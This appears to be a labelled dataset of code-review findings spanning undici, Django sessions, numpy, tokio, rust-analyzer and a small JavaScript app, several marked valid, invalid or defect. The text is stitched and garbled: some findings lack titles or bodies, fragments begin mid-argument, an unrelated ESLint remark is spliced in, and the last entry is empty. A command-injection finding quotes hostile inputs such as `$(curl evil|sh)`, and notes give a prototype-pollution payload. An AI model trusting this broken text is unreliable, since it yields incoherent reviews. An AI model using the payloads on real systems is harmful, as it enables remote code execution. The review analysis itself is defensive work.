findings.title: `chunk.then` throws on undefined chunks in object mode
findings.body:
`stream.read()` returns `null` only at end of stream, but an object-mode stream can legitimately carry `undefined` as a chunk. The old generator yielded it unchanged. Here `chunk.then` throws a TypeError. In `next()` the throw is synchronous (not a rejected promise), `inFlight` and the stream are left in an inconsistent state, and nothing is finalized or destroyed. The same access in `pump()` (line 1506) is worse. It runs inside a `.then` callback, so the TypeError becomes an unhandled rejection, the caller's promise never settles, and `inFlight` stays true forever.

Suggestion: Guard the access: `const then = chunk != null ? chunk.then : undefined;` (or check `typeof chunk === 'object' || typeof chunk === 'function'` first). Apply this in both `next()` and `pump()`.
findings.label: defect:d2

findings.title: next() returns the raw result of a user-supplied `then`, which may not be a promise
findings.body:
For thenable chunks, `next()` returns whatever the chunk's `then` returns. That is only a promise for native promises. A custom thenable (a common shape such as `{ then(res) { res(1); } }`) returns `undefined`, so `next()` returns a non-promise. The values passed to `onChunkFulfilled` and `onChunkRejected` are also discarded, so the iterator result is never delivered. The old generator semantics always produced a promise. The `pump()` path handles this correctly with explicit resolve/reject, so the two paths are inconsistent.

Suggestion: Wrap the thenable in `new Promise((resolve, reject) => FunctionPrototypeCall(then, chunk, ...))`, or use `PromiseResolve(chunk)` after the single read of `then`, so `next()` always returns a genuine promise.

The new line adds noise to the lint run and should be resolved deliberately rather than left failing.

Suggestion: Disable `@typescript-eslint/no-require-imports` for `lib/**` in the ESLint config, since core uses CommonJS. If you only want to quiet this line, add `// eslint-disable-next-line @typescript-eslint/no-require-imports`.

findings.title: Fallback is shadowed when the global was set before freezing
findings.body:
Suppose globalThis already has the `globalDispatcher` symbol property before it is frozen. This is the normal case: the module's own init at line 14 sets it, and Node's internal fetch can set it too. Freezing makes that property non-writable, so the next `defineProperty` with a new value throws a TypeError and the agent goes into `fallbackDispatcher`.

But `getGlobalDispatcher` returns `globalThis[globalDispatcher] ?? fallbackDispatcher`. The old global is non-nullish, so it always wins. `setGlobalDispatcher` reports success but has no effect, and requests keep using the old agent. That can mean the wrong proxy or TLS settings, silently.

Suggestion: Track a flag such as `useFallback = true` when the fallback is set, and have the getter prefer the fallback: `return useFallback ? fallbackDispatcher : globalThis[globalDispatcher]`. Better still, throw a clear error instead of degrading silently.

findings.title: Fallback path never updates the legacy (v1) global dispatcher

That includes Node's bundled undici/fetch and older undici copies, which use the shared `Symbol.for` key. The two globals diverge without any signal.

The fallback is also module-local, so other undici instances (including Node's built-in `fetch`) never see the configured dispatcher. Sharing across instances is the whole purpose of the global symbol.

Suggestion: Store a fallback for the legacy dispatcher as well, or fail loudly. Swallowing the error leaves fetch and undici disagreeing about which dispatcher is in use.

findings.title: Module-local fallback breaks the cross-module shared global dispatcher contract
findings.body:
The design doc says the global dispatcher is "shared among compatible undici modules, including undici that is bundled internally with node.js", and that sharing goes through the `Symbol.for('undici.globalDispatcher.1'/'.2')` slots. The fallback is a module-scoped variable, so with a frozen `globalThis` each undici copy gets its own dispatcher. Node's built-in `fetch` never sees what userland `setGlobalDispatcher` set. The early `return` also skips the legacy (`.1`) slot entirely. Users will see global `fetch` ignore their configured dispatcher with no error.

Suggestion: Document that a frozen `globalThis` breaks sharing, and consider warning (e.g. `process.emitWarning`) when the fallback path is taken. At minimum, keep a legacy fallback as well so behaviour within one module stays consistent.

findings.title: setGlobalDispatcher silently no-ops when globalThis is frozen after a dispatcher was set

A later `defineProperty` with a new value then throws `TypeError`, and the code stores the agent in `fallbackDispatcher` and returns. `getGlobalDispatcher()` evaluates `globalThis[globalDispatcher] ?? fallbackDispatcher`, and the frozen global value is non-nullish, so it keeps returning the old agent. }

This happens in the common case: undici, or Node's bundled fetch, sets the dispatcher first, and the app calls `Object.freeze(globalThis)` later. Freezing makes the existing property non-writable, so a later `setGlobalDispatcher(newAgent)` fails in `defineProperty`. The `TypeError` is caught and `newAgent` goes into `fallbackDispatcher`.

However, `getGlobalDispatcher` returns `globalThis[globalDispatcher] ?? fallbackDispatcher`. The global property is still the old agent, so the fallback is never read. The call appears to succeed but has no effect, and requests keep using the old agent.

Fix options:

- Or clear `fallbackDispatcher` on a successful define and check it first.

findings.title: Swallowed cache delete failure leaves deleted session loadable
findings.body:
cached_db `load()` reads the cache first and only falls back to the DB on a miss. If `self._cache.delete()` fails, the DB row is already gone but the cached session data remains. The exception is now only logged, so `flush()` (used by `logout()`) and `cycle_key()` report success.

A client that still holds the old session key will be served the old session (e.g., an authenticated user id) from the cache until it expires. Previously the exception surfaced, so logout failed loudly instead of silently leaving the session live.

For a write failure, swallowing is mostly harmless staleness. For a delete, it defeats session invalidation.

Suggestion: Consider a fallback when delete fails, such as overwriting the key with a short timeout. Otherwise, at minimum document that invalidation is not guaranteed while the cache is failing. Alternatively, keep raising for deletes triggered by flush/logout.

findings.title: Swallowed cache delete failure leaves revoked session usable
findings.body:
`load()` in cached_db reads the cache first and only falls back to the DB on a miss. `delete()` and `adelete()` back `flush()`/`aflush()`, which `logout()` and `cycle_key()` call.

If the cache delete raises (a transient connection error, or a backend where writes and deletes fail while reads succeed), the DB row is gone but the cached session data survives until its timeout. A stolen or old session cookie then keeps authenticating after the user logged out.

Write failures are a different case. A failed write only means a stale or missing cache entry, which falls back to the DB. A failed delete defeats revocation.

Previously the exception propagated, so logout failed loudly instead of appearing to succeed. Logging at ERROR does not tell the caller that revocation may not have happened.

Suggestion: Keep raising for deletes, or add a compensating step that makes the cached entry unusable. For example, on failure try to overwrite the key with a very short timeout, or record a tombstone. Alternatively, document explicitly that sessions may remain valid in the cache after logout when deletes fail. At minimum, call out the security implication in the docs and release notes.
findings.label: invalid

findings.title: Tests don't verify DB deletion or post-delete state
findings.body:
The failing cache backend also fails `set`, so the session is never in the cache. The tests therefore never exercise the realistic case where a cached entry survives a failed delete.

They also only check the log record. They never assert that the DB row was actually removed, e.g. `self.assertFalse(session.exists(session_key))`. That leaves the core contract, that the DB delete still succeeds, unchecked. The same gap applies to the async test.

Suggestion: After the delete, assert `not session.exists(session_key)` (or `await session.aexists(session_key)` in the async test). Consider a test with a cache that allows set and get but fails delete, so the stale-cache behavior is documented.

findings.title: Swallowed cache-delete failure leaves deleted session usable
findings.body:
`cached_db` reads the cache before the database, so a cache hit returns session data without touching the DB. The DB row is removed by `super().delete()` first. If the cache delete then fails and is merely logged, the session data stays in the cache until it expires.

Any client still holding the old session cookie keeps an authenticated session after logout (`flush()`), and after `cycle_key()` deletes the old key. That is a session-fixation/revocation bypass.

Swallowing write failures is different: a missing or stale write falls back to the DB. A missing delete instead keeps revoked credentials valid. Previously the exception propagated and the logout/flush visibly failed.

Suggestion: Do not silently swallow delete failures. Either let the exception propagate, or make the cache entry unusable on failure: for example, retry, then fall back to writing a tombstone or setting a very short timeout. Another option is to have `load()` verify existence in the DB when the cache is known to be unreliable. At a minimum, document the security implication explicitly.
findings.label: invalid

findings.title: Swallowed cache delete leaves invalidated session alive
findings.body:
A failed cache write is harmless because reads fall back to the database. A failed cache delete is not: the database row is already gone, but the cached entry still holds the full session data, and `load()` serves it from the cache first.

The callers that rely on this delete are security-sensitive:
- `flush()`/`aflush()` on logout
- `cycle_key()` on login (session-fixation protection)

If the delete fails, the old session key stays valid until the cache entry expires. The only trace is a log line. Raising the error used to surface the failure; logging it hides a broken logout or key rotation.

Suggestion: Keep propagating delete failures, or at least re-raise during flush/cycle_key. Alternatively, on failure try to overwrite the cache entry with an empty or expired value before logging, so the stale payload can't be served.

findings.title: Swallowed cache-delete failure leaves a deleted session valid
findings.body:
The database row is deleted first, then the cache delete runs. If that cache delete fails (e.g. the cache server is unreachable) the exception is now only logged. `cached_db` reads from the cache first, so the stale entry keeps serving the session data until the cache entry expires. The `delete()` and `flush()` calls used by logout then appear to succeed while the session stays usable. A stolen session cookie therefore survives a user's logout. Before this change the exception propagated and the caller learned the invalidation failed. A failed write is different: the database stays authoritative, so swallowing it is safe. A failed delete is not safe to swallow, because it breaks session invalidation. The bare `except Exception` also hides programming errors, not just connectivity failures.

Suggestion: Let the exception propagate on delete, as before, so logout failures are visible. If it must be tolerated, log and also mark the session as invalid. For example, re-raise after logging, or overwrite the cache entry with an expired or empty value as a fallback.

findings.title: Fast path skips verbatim protection for tags without a leading space
findings.body:
`_raw_start_re` requires `\s+` between `{%` and `comment|verbatim`. A template like `{%verbatim%}{{ x }}{%endverbatim%}` does not match it, so `tokenize()` takes the `tag_re.split` fast path. The old per-token `self.verbatim` state was removed from `create_token`, so nothing protects the block's contents on that path. `{{ x }}` becomes a VAR token, and the verbatim tag renders it against an empty Context, producing '' instead of the literal text. Inner block tags such as `{% if %}` would now be parsed and can raise TemplateSyntaxError. The old code stripped the tag content, so `{%verbatim%}` worked. `_raw_end_tag_re` does accept `{%verbatim%}`, so the outcome also depends on whether some other `{% verbatim`/`{% comment` with a space appears elsewhere in the template.

Suggestion: Use `r"%s\s*(?:comment|verbatim)\b" % re.escape(BLOCK_TAG_START)` so detection matches the strip()-based semantics of `_raw_end_tag_re`.

Suggestion: Define one whitespace rule (e.g. strip()+split) and apply it consistently to opener detection and closer regex construction.

findings.title: Preallocated plain-ndarray `out` drops subclass of delta
findings.body:
Previously `delta = np.subtract(stop, start, ...)` kept the array subclass of `start`/`stop` (e.g. `MaskedArray`) through `__array_ufunc__`/`__array_wrap__`. Now, for non-scalar inputs, the result is written into `np.zeros(...)`, which is always a base ndarray. `delta` therefore loses its subclass, and for MaskedArray its mask, even though `start`/`stop` are deliberately kept via `asanyarray`. The step returned with `retstep=True` and the intermediate products will differ in type/mask from before. The where-masked lanes also use 0 instead of whatever the subclass would compute. Users passing subclass endpoints may see silently different results, such as masked entries no longer masked in `step`.

Suggestion: Only take the masked path when it is actually needed. For example, compute `delta = np.subtract(stop, start, dtype=type(dt))` normally and fall back to the `where=`/`out=` form only when `equal` has any True entry with infinite values. Alternatively, build `out` with `np.zeros_like(np.broadcast_arrays(start, stop)[0], dtype=type(dt), subok=True)` so the subclass is preserved.
findings.label: defect:d1

findings.title: Extra full-size comparison and allocation on every array call
findings.body:
Every call with array endpoints now does an elementwise `==`, an elementwise `~`, and a `zeros` allocation, even though the NaN problem only arises for equal infinities. For large broadcast endpoint arrays this roughly triples the work spent computing `delta`.

Suggestion: Guard the special path with a cheap check, e.g. only use `where=` when `np.isinf(start).any()` is True; otherwise use the original plain subtraction.

findings.title: Plain ndarray `out=` drops subclass/duck-array semantics of `delta`
findings.body:
`linspace` keeps subclasses through `asanyarray`. Before this change, `delta` came from `np.subtract(stop, start)` and kept the subclass: masked arrays kept their mask, and `__array_ufunc__` types like unit-carrying quantities kept their units. Now the non-scalar path always writes into a freshly allocated base `np.ndarray` via `out=`. For masked arrays the mask on `delta` is silently lost. Some `__array_ufunc__` implementations reject a plain ndarray `out` (for example, unit-aware arrays refusing to write into a unitless output), so a previously working call can now raise. The fix only needs `delta` to be zero where `equal` is true, so it should not change the output container type.

Suggestion: Compute normally and patch the equal positions instead of forcing a base-class out, e.g. `with np.errstate(invalid='ignore') if equal.any() else nullcontext(): delta = np.subtract(stop, start, dtype=type(dt))`, then `delta = _nx.where(equal, 0, delta)`. Alternatively, allocate `out` with `np.zeros_like(np.broadcast_arrays(start, stop)[0], dtype=type(dt), subok=True)`.
findings.label: defect:d1

findings.title: Complex-infinity cases likely become NaN before the new code runs
findings.body:
`linspace` normalizes its inputs with `asanyarray(start) * 1.0`. For a complex array, `1.0` is promoted to `1+0j` and a full complex multiply is done. For `complex(inf, 0)` the imaginary part is `inf*0 + 0*1 = nan`, and similarly for the other cases. That turns `start`/`stop` into values containing NaN and raises an 'invalid value' RuntimeWarning. Under `simplefilter('error', RuntimeWarning)` that warning becomes an error. Even without the filter, `start == stop` would be False and the NaN check would fail. These assertions likely do not test what they claim, or they will fail.

Suggestion: Check this test against the actual `* 1.0` normalization. If it fails, either change the normalization so it does not do a full complex multiply (e.g. use `astype` with the result dtype), or drop or adjust the complex-infinity cases.

findings.title: Plain-ndarray `out=` / `dt.type(0)` drops subclass information from `delta`
findings.body:
Before this change, `np.subtract(stop, start, dtype=...)` dispatched through `__array_ufunc__`, so `delta` kept the subclass type and metadata of the inputs (masked arrays, unit-carrying Quantity-like subclasses, etc.).

Now the array path writes into `out=np.zeros(...)`, a bare ndarray, and the 0-d equal path returns `dt.type(0)`, a bare scalar. Two failures follow:
- Subclasses that refuse a non-subclass `out` raise.
- Subclasses that accept it silently lose their metadata. For unit-aware arrays, `y = y * delta` then becomes dimensionless and `y += start` either fails or produces wrong units.

The 0-d branch also only discards the subclass when the endpoints are equal, which is an inconsistent special case.

Suggestion: Compute the subtraction normally and patch only the equal elements, keeping subclass dispatch. For example, run `with np.errstate(invalid='ignore')` only around the equal positions, or do `delta = np.subtract(stop, start, dtype=type(dt), where=~equal, out=np.zeros_like(np.broadcast_to(start, equal.shape), dtype=type(dt)))`. In the scalar branch, use `delta = (stop - stop) * 0` style arithmetic or `np.zeros_like(stop, dtype=type(dt))[()]`, which preserve type.

`0.0 == -0.0` is True, so `delta` is now `+0.0`. Previously `-0.0 - 0.0` gave `-0.0`. As a result, `retstep` reports `0.0` instead of `-0.0`, and interior signs can differ from the old behaviour. This is a minor, undocumented behaviour change.

Suggestion: Restrict the replacement to non-finite equal endpoints, e.g. `equal = (start == stop) & ~np.isfinite(start)`.

This has two effects:
- Subclasses that reject an ndarray output (unit-aware arrays and similar) will now raise.
- Others, such as `np.ma`, silently lose mask or metadata on `delta`.

That changes the path for every non-scalar input, not only inputs with infinities.

Suggestion: Only use the masked path when it is needed, and keep the plain subtraction otherwise:
```python

    delta = dt.type(0) if equal else np.subtract(stop, start, dtype=type(dt))
else:
    delta = np.subtract(stop, start, dtype=type(dt))
    if np.any(equal):
        delta = np.where(equal, dt.type(0), delta)  # or compute masked only in this branch
```
Alternatively, build `out` with `np.zeros_like(np.broadcast_arrays(start, stop)[0], dtype=dt)` so the subclass is preserved.

findings.title: Avoid unconditional plain-array output allocation
findings.body:
The array branch always writes into a freshly allocated plain `np.zeros` buffer, even when no endpoints are equal. This silently drops array subclasses and their extra state, such as masks or units, that the original `np.subtract(stop, start, ...)` preserved, so `linspace` can behave differently for subclass inputs. Use the original subtraction unless some elements are actually equal, and use the `where=` path only in that case.

findings.title: Use thread-safe errstate instead of warnings filter
findings.body:
CI runs the suite under `pytest-run-parallel`. `warnings.catch_warnings()` with `simplefilter` changes process-global warning state, so it is not thread-safe and can make this test, or tests running beside it, fail intermittently. `np.errstate` is context-local, so `np.errstate(invalid="raise")` is safe there and checks the exact floating-point "invalid value" condition the fix targets. Make the same change to the `with warnings.catch_warnings():` line and drop the now-unused `import warnings`.

Improved code:

findings.title: New delta construction drops ndarray subclass type and metadata
findings.body:
`delta` used to come from `np.subtract(stop, start, dtype=...)`, which goes through ufunc/`__array_wrap__`/`__array_ufunc__` dispatch and preserves subclasses and unit-like metadata. The scalar branch now returns a bare `dt.type(0)`. The array branch writes into a plain `np.zeros` `out`. For subclassed or unit-carrying inputs, `delta` becomes a plain unitless value or ndarray even though `start` and `stop` carry type or units. The later `y * delta` and `y += start` then behave differently, or raise. Both new paths are also an extra code path that must stay in sync with the ordinary subtraction.

Suggestion: Keep the original `np.subtract` call as the default path and only special-case the equal elements. For example, compute `delta = np.subtract(stop, start, dtype=type(dt), where=~equal, out=np.zeros_like(stop, dtype=type(dt)))` for all ndims, so the type goes through `zeros_like`/ufunc handling. Alternatively, apply the `where` fix only when the inputs are exact ndarrays.
findings.label: defect:d1

findings.title: Array path forces a plain ndarray `delta`, dropping subclass type
findings.body:
`start` and `stop` come from `asanyarray`, so subclasses (masked arrays, unit-carrying arrays and similar) previously propagated through `np.subtract`. The array branch now passes `out=np.zeros(...)`, a plain ndarray, so `delta` and everything derived from it silently lose the subclass type and any mask or metadata. This also costs an extra `==`, `~` and `zeros` allocation on every non-scalar call, even when no endpoints are equal. The 0-d branch yields a bare numpy scalar rather than the subtraction result, so the two branches behave differently.

Suggestion: Avoid `out=` and compute `delta = np.subtract(stop, start, dtype=type(dt), where=~equal)`, then `delta = np.where(equal, 0, delta)` or `delta[equal] = 0`. Alternatively, build `out` with `np.zeros_like(equal, dtype=type(dt))` so the subclass is kept.
findings.label: defect:d1

findings.title: Complex-infinity cases may not exercise the fix and could fail
findings.body:
`linspace` first computes `start = asanyarray(start) * 1.0`. Multiplying a complex value such as `inf+0j` by the weakly-typed float 1.0 uses the full complex product, where `inf*0` gives NaN in the imaginary part. The endpoint can therefore become `inf+nanj`, and `start == stop` is False because NaN != NaN. In that case the new equality shortcut never triggers and the assertion against `np.full(3, cinf)` would fail or warn. Pure-real or pure-imaginary infinities such as `complex(np.inf, 0)` and `complex(0, np.inf)` are the likely trouble spots. The test asserts behaviour that the fix does not guarantee.

Suggestion: Verify these cases, and drop or adjust the ones that rely on `inf*1.0` for complex. If complex support is intended, fix the `* 1.0` coercion (for example use `.astype(dt)` or `+ 0.0`) so the infinite endpoints are preserved.

findings.title: Array path drops ndarray subclass type of `delta`

With `out=np.zeros(...)` the result is always a plain ndarray. Masks and metadata are lost on the n-d path, while the 0-d path is unaffected, so behaviour becomes inconsistent. `where=` plus `out=` also bypasses `__array_wrap__`/`__array_ufunc__` handling that subclasses relied on.

Suggestion: Allocate the output with `np.zeros_like(delta_template)` or `np.empty_like` of a subclass-preserving array, or compute `delta = np.subtract(stop, start, dtype=type(dt))` under `np.errstate(invalid='ignore')` and then fix up only the equal-endpoint elements with `np.where`/`copyto`.

Every n-d `linspace` call now does an elementwise `==`, a `~` negation, and an `np.zeros` allocation in addition to the subtraction. This slows the common case (finite, unequal endpoints) to fix a rare one. The cost is small for scalars but noticeable for large broadcast endpoint arrays.

Suggestion: Only take the masked path when equal elements exist (for example `equal.any()`), otherwise use the plain `np.subtract`.

findings.title: Array path drops ndarray subclass of `delta`
findings.body:
`linspace` builds `start` and `stop` with `asanyarray(...) * 1.0`, so subclasses such as masked arrays or unit-carrying arrays are preserved. The old `np.subtract(stop, start, dtype=...)` returned the subclass through `__array_wrap__`. The new array branch passes a plain `np.zeros(...)` as `out=`, so `delta` is always a base `ndarray`. Subclass information (mask, units, metadata) is lost from the step and therefore from the result. This only affects non-0-d inputs, so scalar calls keep the old behaviour. The path also allocates an extra zeros array plus a `~equal` temporary on every array call, which is a small performance cost.

findings.title: Empty-results guard misses window objects and silently falls through to concat([])
findings.body:
The guard only short-circuits for `ABCSeries` and for `BaseGroupBy` with 1-D selection. Any other `obj` with empty `results` falls through to `concat(results, ...)`, which raises "No objects to concatenate". Examples are a `BaseWindow` (Series/DataFrame `.rolling(...).agg([])`, `.expanding().agg([])`) or a DataFrame reaching this path. So GH#39609 is fixed for some aggregation entry points but not others, leaving inconsistent behaviour. The fallthrough is also implicit, so a future caller passing a 2-D groupby here with no results would get the old opaque error.

Suggestion: Handle the empty case explicitly for every supported `obj` type, including `BaseWindow` (use `obj._selected_obj` with the window's result index). Otherwise raise a clear `ValueError` at the end of the `if not results` block instead of falling through to `concat`.

For a Resampler, `obj.size()` runs a complete groupby-size computation over all the data only to discard the values and keep the index. On large resamples this is a non-trivial cost for a no-op aggregation. It also relies on `size()` and `agg` producing identical indexes, for example with respect to empty bins, `as_index` and `group_keys` handling. That coupling is fragile.

Suggestion: Derive the index from the resampler's binner/grouper (e.g. `obj._grouper.result_index` for plain resamplers, and only fall back to the size-based approach for the groupby-resample mixin).

Before this change, if no arg resolved to an existing anchor, `_try_load_conftest(invocation_dir)` loaded `invocation_dir/conftest.py` and also every `invocation_dir/test*/conftest.py`. findings.title: Inverted check disables semantic diagnostics after the first load
findings.body:
The comment says to fetch semantic diagnostics only after build data and proc-macros have finished loading once. The code instead requires `last_op_result().is_none() && !op_in_progress()`, which is true only if the operation has never started.

This is the default setup: build scripts and proc-macros are enabled. In that case the condition is true only briefly before the first fetch begins. Once build data or proc-macros complete, `last_op_result()` becomes `Some` and stays `Some`. From then on `fetch_semantic` is false for the rest of the session.

The result is that semantic diagnostics such as type errors never show up in normal use. That is the opposite of the intended behavior.

Suggestion: let fetch_semantic = self.vfs_done
    && self.fetch_workspaces_queue.last_op_result().is_some()
    && (!self.config.run_build_scripts(None)
        || (self.fetch_build_data_queue.last_op_result().is_some()
            && !self.fetch_build_data_queue.op_in_progress()))
    && (!self.config.expand_proc_macros()
        || (self.fetch_proc_macros_queue.last_op_result().is_some()
            && !self.fetch_proc_macros_queue.op_in_progress()));
findings.label: defect:d1

findings.title: Gate uses the global build-scripts setting instead of the per-root one
findings.body:
`run_build_scripts(None)` reads the global `cargo.buildScripts.enable` value and ignores per-source-root overrides. If a user disables build scripts for a specific root but leaves them enabled globally, this gate still waits on build data. Diagnostics can then be withheld or gated inconsistently for that root.

Suggestion: Make sure the gating matches how build data fetching itself is configured. If that fetch is workspace-global, document that the global value is intentional here.

findings.title: Inverted check disables semantic diagnostics after build data/proc-macros load
findings.body:
The comment says semantic diagnostics should be fetched only after build data and proc-macros have finished loading once. The code instead requires `last_op_result().is_none()`, meaning the operation has never produced a result, and not in progress.

This breaks in both directions:
- Before the first run starts, the condition is true, so diagnostics are fetched too early. This is exactly what the change meant to avoid.
- Once the first build-data or proc-macro load completes, `last_op_result()` becomes `Some` and stays that way. `fetch_semantic` is then false forever.

With the default config (build scripts and proc-macros enabled), users lose all semantic diagnostics after startup.

Suggestion: && (!self.config.run_build_scripts(None)
    || (self.fetch_build_data_queue.last_op_result().is_some()
        && !self.fetch_build_data_queue.op_in_progress()))
&& (!self.config.expand_proc_macros()
    || (self.fetch_proc_macros_queue.last_op_result().is_some()
        && !self.fetch_proc_macros_queue.op_in_progress()));

findings.title: Diagnostics suppressed during every rebuild, not just the first load
findings.body:
Gating on `!op_in_progress()` hides semantic diagnostics whenever build data or proc-macros are being re-fetched, for example after a `Cargo.toml` edit. This applies to every rebuild, not only the initial load. The comment says "finished ... once", which suggests only the first load should block. Rebuilds can take a long time, so diagnostics disappearing or going stale for that whole period is a visible regression.

Suggestion: If only the initial load should gate diagnostics, drop the `!op_in_progress()` clause and rely on `last_op_result().is_some()`.

findings.title: Unsupported PIDFD_NONBLOCK is re-probed on every spawn
findings.body:
`PIDFD_NONBLOCK` is only accepted from Linux 5.10. Kernels 5.3–5.9 have `pidfd_open` but reject the flag with EINVAL. Only ENOSYS is cached in `NO_PIDFD_SUPPORT`, so on those kernels every spawn pays a failing syscall before falling back to the signal reaper.

Suggestion: Also cache EINVAL (when caused by the flag) in `NO_PIDFD_SUPPORT`, or open without the flag and set O_NONBLOCK via fcntl.
findings.label: nit

findings.title: Runtime-shutdown detection relies on error string matching
findings.body:
`is_rt_shutdown_err` identifies the shutdown condition by comparing the deprecated `description()` against `RUNTIME_SHUTTING_DOWN_ERROR`. Two things can silently break it:
- the message changes, or
- the error is wrapped or constructed differently (e.g. via `format!` or a different error type).

If either happens, the re-register path stops working and `wait()` from a new runtime returns a spurious error.

Suggestion: Have the registration expose a typed shutdown error, such as a dedicated `ErrorKind`/inner error type or a `Registration::is_shutdown()` check, instead of matching on text.
findings.label: nit

findings.title: Wait can hang when the spawning runtime is alive but idle
findings.body:
The pidfd `PollEvented` is registered with the I/O driver of the runtime that spawned the child. Re-registration only happens when that runtime is shut down.

If the child is spawned in runtime A and awaited from runtime B while A still exists but nobody drives it (e.g. an idle current_thread runtime), the readiness event is only seen by A's driver. B's task is never woken and `wait()` hangs.

The previous signal-based path did not have this problem: the global signal pipe is broadcast to listeners through any running runtime's signal driver. This is a behavioral regression for cross-runtime use, which the new integration test explicitly treats as supported.

Suggestion: Re-register the pidfd when the current `scheduler::Handle` differs from the one used at registration, not only on a shutdown error. Alternatively, fall back to the signal reaper when the child is polled from a different runtime.
findings.label: valid

findings.title: Kernel version parsing panics on releases without '-'
findings.body:
`stdout.split_once('-').unwrap()` panics on kernel release strings without a dash (e.g. custom builds reporting `6.5.0\n`). Any trailing newline/suffix on the minor component also makes `parse()` panic. The tests then fail instead of being skipped.

Suggestion: Parse leniently, e.g. `let ver = stdout.trim().split(|c: char| !c.is_ascii_digit() && c != '.').next().unwrap_or("");`. Better still, probe pidfd support directly via `Pidfd::open(std::process::id())`.
findings.label: valid

findings.title: cfg gate mismatches the module that uses these methods
findings.body:
The new `poll_read_ready`/`reregister` methods are gated on `feature = "process"` + linux, but their only user (`pidfd_reaper`) also requires `feature = "rt"`. With `process` enabled and `rt` disabled they are dead code, which triggers unused warnings that fail builds using `-D warnings`.

Suggestion: Use `#[cfg(all(feature = "process", feature = "rt", target_os = "linux"))]` to match the module gate.
findings.label: invalid

findings.title: Spawned child leaked unreaped when pidfd registration fails
findings.body:
If `PidfdReaper::new` returns `Err((Some(err), _child))`, the already-spawned `StdChild` is silently dropped and the error is returned. Dropping a `std::process::Child` neither kills nor waits on the process. The child keeps running with no handle and becomes a zombie that is never pushed to the orphan queue. Registration can fail for transient reasons such as fd limits or epoll errors, and the caller has no way to tell that a process was actually started.

Suggestion: On `Err((Some(err), child))`, fall back to the signal reaper instead of failing. If an error must be returned, first `kill()` the child and push it to `GlobalOrphanQueue` so it is reaped.

Suggestion: Gate both methods with `#[cfg(all(feature = "process", feature = "rt", target_os = "linux"))]`.

findings.title: Panic when pidfd readiness does not mean the child has exited
findings.body:
The future treats any readiness from `poll_read_ready` as proof that the process has exited and `expect`s `try_wait()` to return `Some`.

That assumption can fail in several ways:
- Readiness can be stale or spurious; tokio's `ScheduledIo` keeps readiness until it is explicitly cleared.
- After `reregister` on a new driver, the fresh registration starts out assuming readiness.
- Epoll can report HUP/ERR.

findings.title: Orphans pushed by PidfdReaper are never reaped
findings.body:
When a `PidfdReaper` is dropped before the child exits, the child is pushed onto the global orphan queue. That queue is only drained (`reap_orphans`) from the signal-based `Reaper::poll`, which runs on SIGCHLD. On the pidfd path, `spawn_child` no longer creates a SIGCHLD `Signal` listener and nothing in `PidfdReaper` drains the queue. If every child is spawned through pidfd, dropped-but-still-running children become zombies and stay in the queue until some unrelated signal-based reaper happens to run. This regresses the behaviour that dropped `Child` values are eventually reaped.

Suggestion: Make sure orphans are drained on the pidfd path. For example, register a SIGCHLD listener to drive `reap_orphans`, or reap orphans on spawn and on drop. Alternatively, register the orphan's pidfd with the runtime so it is waited on in the background.

findings.title: Cross-runtime reregistration only triggers on shutdown error

If the child was spawned on runtime A that is still alive but not being driven (for example an idle current_thread runtime), and it is awaited on runtime B, the readiness event is delivered through A's driver and the future never wakes. Also, the old registration is deregistered with its error silently ignored (`let _ =`), and if creating the new registration fails, `self.registration` is left as the stale one.

Suggestion: Re-register against the current runtime handle when the registration's handle differs from `Handle::current()`, not only after a shutdown error. Handle a failure of the new registration explicitly.

findings.title: Comma delimiter corrupts paths that contain commas
findings.body:
`paths.sort().join(",")` uses `,` as the separator. Commas are valid sub-delimiters in pathnames, and browsers do not percent-encode them in `location.pathname` or link hrefs. A path like `/products/red,blue` is therefore sent as `red,blue` and split on the server into `/products/red` and `/blue`. The real path never gets matched, so its route patches are missing and client-side navigation to that URL fails with a 404 or error boundary. It can also trigger discovery of unrelated routes. This is a regression from the previous repeated-param encoding, which was unambiguous.

Suggestion: Escape each element before joining and unescape after splitting, e.g. client: `searchParams.set("paths", paths.sort().map(encodeURIComponent).join(","))`; server: `pathParam.split(",").filter(Boolean).map(decodeURIComponent)` (wrapped in try/catch). Alternatively use a delimiter that is pre-escaped per path.
findings.label: defect:d1

Those cached clients then fail to discover their routes.

Suggestion: Escape/unescape individual paths, and during a transition window also accept legacy params: `let pathnames = pathParam ? ... : url.searchParams.getAll("p").length ? url.searchParams.getAll("p") : [fallback]`.

findings.title: Avoid catastrophic backtracking in email regex

The nested quantifier `([a-zA-Z0-9]+\.?)+` backtracks exponentially on long alphanumeric strings that do not match (e.g. 'aaaa...a!'). A single crafted input can block the event loop (ReDoS).

Suggestion: return /^[a-zA-Z0-9]+(\.[a-zA-Z0-9]+)*\.?@example\.com$/.test(input);
findings.label: defect:redos

findings.title: Off-by-one
findings.body: The loop condition `i <= list.length` reads one past the end of the array. `list[list.length]` is `undefined`, so `.name` throws a TypeError. `displayNames` fails on every call, including with an empty array. Use `i < list.length` or `list.map(u => u.name)`.
findings.label: defect:offbyone

findings.title: Race Condition
findings.body: `reserveUsername` checks `reserved.has(name)`, awaits `checkProfanity`, and only then adds the name. Two concurrent calls with the same name both pass the check before either adds it, so both return `true` and the same username is reserved twice. Reserve the name before the `await` and roll back if the check fails, or track in-flight reservations.
findings.label: defect:race

findings.title: Command Injection
findings.body: `name` is concatenated into a shell command and run with `execSync`. A value like `x; rm -rf ~` or `$(curl evil|sh)` runs arbitrary commands. Use `execFileSync("pdf-render", ["--out", "/tmp/reports", `${name}.pdf`])` and validate or sanitize `name`, which also blocks path traversal.
findings.label: defect:cmdinj

notes: Sensitive information exposure: `src/config.ts` hardcodes a live payments token (`PAYMENTS_API_TOKEN = "tok_live_..."`) in source. It should be revoked and loaded from a secret store or environment variable.
Code injection: `evaluate` in `src/calc.ts` passes `formula` directly to `eval`. Any untrusted input can execute arbitrary JavaScript in the Node process.
Command injection: `exportReport` in `src/export.ts` builds a shell command from `name` (see key issue).

Prototype pollution: `mergeSettings` recursively merges arbitrary keys without blocking `__proto__`, `constructor` or `prototype`. Input such as `JSON.parse('{"__proto__":{"isAdmin":true}}')` pollutes `Object.prototype`.

Weak webhook authentication: `SECRET` falls back to `""` when `WEBHOOK_SECRET` is unset. Anyone can then compute a valid HMAC and forge webhooks. The signature is also compared with `===`, which is not constant-time. Fail closed when the secret is missing and use `crypto.timingSafeEqual`.

ReDoS: the regex `^([a-zA-Z0-9]+\.?)+@example\.com$` in `isValidEmail` has nested quantifiers. A long alphanumeric string that fails to match, e.g. `"a".repeat(40) + "!"`, causes catastrophic backtracking and blocks the event loop.

findings.title: Code Injection
